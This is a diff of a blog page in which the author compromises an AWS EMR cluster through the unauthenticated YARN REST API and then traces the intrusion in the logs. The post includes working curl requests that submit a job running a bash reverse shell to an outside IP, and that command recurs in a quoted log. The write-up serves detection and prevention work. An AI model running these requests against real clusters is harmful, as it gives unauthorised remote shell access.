-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>2020-06-20 20:09:04,216 INFO org.apache.hadoop.yarn.server.resourcemanager.RMAuditLogger <span style=color:#2c5dcd>(</span>qtp677217562-27<span style=color:#2c5dcd>)</span>: USER<span style=color:#2c5dcd>=</span>dr.who OPERATION<span style=color:#2c5dcd>=</span>Submit Application Request TARGET<span style=color:#2c5dcd>=</span>ClientRMService RESULT<span style=color:#2c5dcd>=</span>SUCCESS APPID<span style=color:#2c5dcd>=</span>application_1590702911576_0016 QUEUENAME<span style=color:#2c5dcd>=</span>default
-</code></pre></td></tr></table>
-</div>
-</div><p>Combining several other log entries from this file will show the entire lifecyle of the application. This is very helpful when attempting to pull together a detailed timeline of all the events.</p>
-<hr>
-<h3 id=next-steps>Next Steps</h3>
-<p>Now that we have a general understanding of what occured, and where it occured we have to begin digging into the activity that occured on the node which spawned the reverse shell. If there are hundreds of application run requests they will all have to be examined. Without an understanding of each request it&rsquo;s hard to say exactly what occured or which nodes were potentially compromised.</p>
-<hr>
-<h3 id=prevention>Prevention</h3>
-<p>Preventing this behavior is straight forward, do not expose EMR clusters to the Internet. Thats it. Make sure the security groups associated with each node in the cluster are scoped to the minium access required to manage and maintain the systems. There is even a GuardDuty alert <a href=https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_recon.html#PortProbeEMRUnprotectedPort>Port Probe EMR Unprotected Port</a>. That will fire if someone scans a sensitive port (8088).</p>
-<hr>
-<h3 id=additional-resources>Additional Resources</h3>
-<p>Additional references, I leaned on these heavily while trying to better understand this space:</p>
-<ul>
-<li><a href=https://blog.radware.com/security/2018/11/hadoop-yarn-an-assessment-of-the-attack-surface-and-its-exploits/>Hadoop YARN: An Assessment of the Attack Surface and Its Exploits</a></li>
-<li><a href=https://medium.com/@ivan.vasquez/dont-let-dr-who-hijack-your-emr-cluster-9bb67daa4641>Don&rsquo;t let Dr.Who hijack your EMR cluster</a></li>
-<li><a href=https://medium.com/@neerajsabharwal/hadoop-yarn-hack-9a72cc1328b6>Hadoop Yarn hack?</a></li>
-</ul>
-</div>
-</div>
-<div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0>
-<nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav>
-<h5>contents</h5>
-<ul class="nav post-sidenav">
-<li><nav id=TableOfContents>
-<ul>
-<li>
-<ul>
-<li><a href=#setting-up-a-cluster>Setting Up a Cluster</a></li>
-<li><a href=#compromising-emr>Compromising EMR</a></li>
-<li><a href=#logging>Logging</a></li>
-<li><a href=#next-steps>Next Steps</a></li>
-<li><a href=#prevention>Prevention</a></li>
-<li><a href=#additional-resources>Additional Resources</a></li>
-</ul>
-</li>
-</ul>
-</nav></li>
-</ul>
-</nav>
-</div>
-</div>
-</div>
-</div>
-<footer>
-</footer>
-</body>
-<script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-133811886-2")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><script src=/js/nav.js></script>
+<link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous><link rel=stylesheet href=/css/main.css><title>emr_security_woes | jellyparks</title></head><body><header></header><div class=site-wrapper><div class="sticky top-bar"><div id=mySidenav class=sidenav include-nav=/nav.html></div><span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span></div><div class=container><div class=blog-header><h1>emr_security_woes</h1></div><div class=row><div class="col-sm-8 blog-main"><div class=blog-post><hr><p>I recently had the opportunity to dig deeper into the Elastic Map Reduce (EMR) service in AWS. According to the official Amazon docs (here) &ldquo;&mldr;EMR is a manged cluster platform that simlifies running big data frameworks&mldr;&rdquo; Full disclosure I have virtually zero experience with big data and big data platforms. The closest I&rsquo;ve gotten to that space is storing data in S3 and searching it with Athena. Oh, I also sometimes search enterprise Splunk without specifying an index or sourcetype. That counts right?</p><p>The reason I was digging into EMR was not to learn more about big data, hadoop, spark, etc. But instead it was to answer a few simple questions. How would someone compromise a cluster, and on the flip side, how could you detect it was compromised and what the attackers did after compromise.</p><hr><h3 id=setting-up-a-cluster>Setting Up a Cluster</h3><p>Amazon has done an amazing job at making it really easy to deploy an EMR cluster. In fact its just a few clicks and its up. Within the EMR section select <code>create</code> to create a cluster. Once the <code>Create Cluster - Quick Options</code> page loads configure your cluster to meet your needs. For this example select release emr-6.0.0 with Spark, Yarn, and Zeppelin.</p><p>Select the key pair to use for the instances which will be part of the cluster, and then click the <code>Create Cluster</code> button. A screenshot of the configuration setup is below.</p><p><img src=images/create_cluster.png alt=create_cluster class=img-fluid></p><p>The instances will spin up fairly quickly, the cluster will become fully operational in about 3-5 minutes. Once it&rsquo;s ready the cluster status will be <code>Waiting, Cluster Ready</code> the green dot next to the cluster name will be solid green as pictured below</p><p><img src=images/cluster_ready.png alt=cluster_ready.png class=img-fluid></p><p>In order to access the cluster make sure to add a security group to the primary node which gives access to 8088. <strong>DO NOT EXPOSE THIS TO THE ENTIRE INTERNET</strong>. I cannot stress this enough, do not expose the port to entire Internet, only allow access from a trusted IP.</p><hr><h3 id=compromising-emr>Compromising EMR</h3><p>As it turns out with improper security configurations an EMR deployment can be compromised with a couple of curl requests or a quick python script.</p><p>The first request we need to make constructs a new application for us, and returns various meta details about the applicaiton.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl --request POST <span style=color:#0c6>&#39;PRIMARYHOST:8088/ws/v1/cluster/apps/new-applicaion&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>If successful we get a response similar to the one below:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style=background-color:#e5e5e5><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span></span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex;background-color:#e5e5e5><span> <span style=color:#2c5dcd;font-weight:700>&#34;application-id&#34;</span>: <span style=color:#0c6>&#34;application_1590702911576_0016&#34;</span>,
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd;font-weight:700>&#34;maximum-resource-capability&#34;</span>: {
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;memory&#34;</span>: <span style=color:#5918bb;font-weight:700>12288</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;vCores&#34;</span>: <span style=color:#5918bb;font-weight:700>4</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;resourceInformations&#34;</span>: {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;resourceInformation&#34;</span>: [
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;maximumAllocation&#34;</span>: <span style=color:#5918bb;font-weight:700>9223372036854775807</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;minimumAllocation&#34;</span>: <span style=color:#5918bb;font-weight:700>0</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;memory-mb&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;resourceType&#34;</span>: <span style=color:#0c6>&#34;COUNTABLE&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;units&#34;</span>: <span style=color:#0c6>&#34;Mi&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#5918bb;font-weight:700>12288</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;maximumAllocation&#34;</span>: <span style=color:#5918bb;font-weight:700>9223372036854775807</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;minimumAllocation&#34;</span>: <span style=color:#5918bb;font-weight:700>0</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;name&#34;</span>: <span style=color:#0c6>&#34;vcores&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;resourceType&#34;</span>: <span style=color:#0c6>&#34;COUNTABLE&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;units&#34;</span>: <span style=color:#0c6>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd;font-weight:700>&#34;value&#34;</span>: <span style=color:#5918bb;font-weight:700>4</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>   ]
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span>}</span></span></code></pre></td></tr></table></div></div><p>The main field we care about is the application-id field. The resource information is also important. We need to make sure that we do not request resources beyond the capacity of the resources allocted for the applications.</p><p>The next step is to execute the application. Within an exection request, we define additional parameters for the job. There are all kinds of configuration options such as resources to consume, commands to run, and a lot of other things that are well beyond the scope of this article. The POST request below will call our application and have it run a simple reverse shell:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl --request POST <span style=color:#0c6>&#39;PRIMARYHOST:8088/ws/v1/cluster/apps&#39;</span> <span style=color:#c5060b;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#c5060b;font-weight:700></span>--header <span style=color:#0c6>&#39;Accept: application/json&#39;</span> <span style=color:#c5060b;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#c5060b;font-weight:700></span>--header <span style=color:#0c6>&#39;Content-Type: application/json&#39;</span> <span style=color:#c5060b;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#c5060b;font-weight:700></span>--data-raw <span style=color:#0c6>&#39;{
+</span></span></span><span style=display:flex><span><span style=color:#0c6> &#34;max-app-attempts&#34;:2,
+</span></span></span><span style=display:flex><span><span style=color:#0c6> &#34;am-container-sepc&#34;:{
+</span></span></span><span style=display:flex><span><span style=color:#0c6>  &#34;commands&#34;:{
+</span></span></span><span style=display:flex><span><span style=color:#0c6>   &#34;command&#34;:&#34;/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/3.94.211.164/6767 0&gt;&amp;1&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#0c6>   }
+</span></span></span><span style=display:flex><span><span style=color:#0c6> },
+</span></span></span><span style=display:flex><span><span style=color:#0c6> &#34;application-id&#34;:&#34;application_1590702911576_0016&#34;,
+</span></span></span><span style=display:flex><span><span style=color:#0c6> &#34;application-type&#34;:&#34;YARN&#34;,
+</span></span></span><span style=display:flex><span><span style=color:#0c6> &#34;application-anem&#34;:&#34;yupyup&#34;
+</span></span></span><span style=display:flex><span><span style=color:#0c6>}&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Once the curl request is made to run the application we can expect a 202 response with no data. A 202 response means the application run request was submitted successfully. It DOES NOT mean the application ran successfully. If there are any configuration errors or other errors the response is still going to be a 202. Just because the applicaiton was submitted successfully does not mean that it will be processed and executed succesfully.</p><p>In the web GUI at <code>http://PRIMARYHOST:8088/cluster</code> we see that the application ID we called to run will now have an execution history. The user will be <code>dr.who</code> because we created and called the application without authenticating. The other columns have details about various things such as the start times, launch times, etc. Even though the &lsquo;State&rsquo; and &lsquo;FinalStatus&rsquo; columns may say failed the shell code within the application was probably ran.</p><p><img src=images/application_run.png alt=application_run class=img-fluid></p><hr><h3 id=logging>Logging</h3><p>As an attacker we can confirm if this worked by checking to see if we have a shell from one of the nodes within the cluster, but how can we as defenders tell if the execution was successful? Good news, all of the activity above is logged. By digging into the logs a bit we should be able to tell what commands were executed and where they were executed at.</p><p>When we setup the cluster we enabled logging to a S3 folder. All of our applications will log to this folder. If everything was left to the defaults the logging folder will be something similar to this: <code>s3://aws-logs-ACCOUNT-us-east-1/elasticmapreduce/CLUSTER ID</code>. Within this folder we can pull container logs out for each application. They&rsquo;ll be in a subfolder similar to this <code>/containers/application_1590702911576_0016/container_1590702911576_0016_02_000001/launch_container.sh.gz</code></p><p>The <code>launch_container.sh</code> log will have exection details for the application when it was called. In the log output below we can see that the last line contains the reverse shell code that we included in the POST request above when we ran our malicious applicaiton.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#0080ff;font-style:italic># Creating copy of launch script</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cp <span style=color:#0c6>&#34;launch_container.sh&#34;</span> <span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>chmod <span style=color:#5918bb;font-weight:700>640</span> <span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#0080ff;font-style:italic># Determining directory contents</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#5918bb;font-weight:700>echo</span> <span style=color:#0c6>&#34;ls -l:&#34;</span> 1&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ls -l 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#5918bb;font-weight:700>echo</span> <span style=color:#0c6>&#34;find -L . -maxdepth 5 -ls:&#34;</span> 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>find -L . -maxdepth <span style=color:#5918bb;font-weight:700>5</span> -ls 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#5918bb;font-weight:700>echo</span> <span style=color:#0c6>&#34;broken symlinks(find -L . -maxdepth 5 -type l -ls):&#34;</span> 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>find -L . -maxdepth <span style=color:#5918bb;font-weight:700>5</span> -type l -ls 1&gt;&gt;<span style=color:#0c6>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#5918bb;font-weight:700>echo</span> <span style=color:#0c6>&#34;Launching container&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#5918bb;font-weight:700>exec</span> /bin/bash -c <span style=color:#0c6>&#34;bash -i &gt;&amp; /dev/tcp/3.94.211.164/6767 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>At this point we know what was ran, but we don&rsquo;t know which node the malicious code was executed. This is going to be critical to discover so that we can conduct further analysis of the system to see what else the attacker did. To do this we need to change to a new directory within S3 to find the node logs. Node logs can be found here: <code>node/NODE INSTANCE ID/applications/hadoop-yarn</code></p><p>These logs are local logs for each instance in the cluster and show all of the application submissions. A sample output is below.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style=background-color:#e5e5e5><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span></span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style=background-color:#e5e5e5><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span></span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-bash data-lang=bash><span style=display:flex><span>2020-06-20 20:09:04,277 INFO SecurityLogger.org.apache.hadoop.ipc.Server <span style=color:#2c5dcd>(</span>Socket Reader <span style=color:#0080ff;font-style:italic>#1 for port 8041): Auth successful for appattempt_1590702911576_0016_000001 (auth:SIMPLE)</span>
+</span></span><span style=display:flex><span>
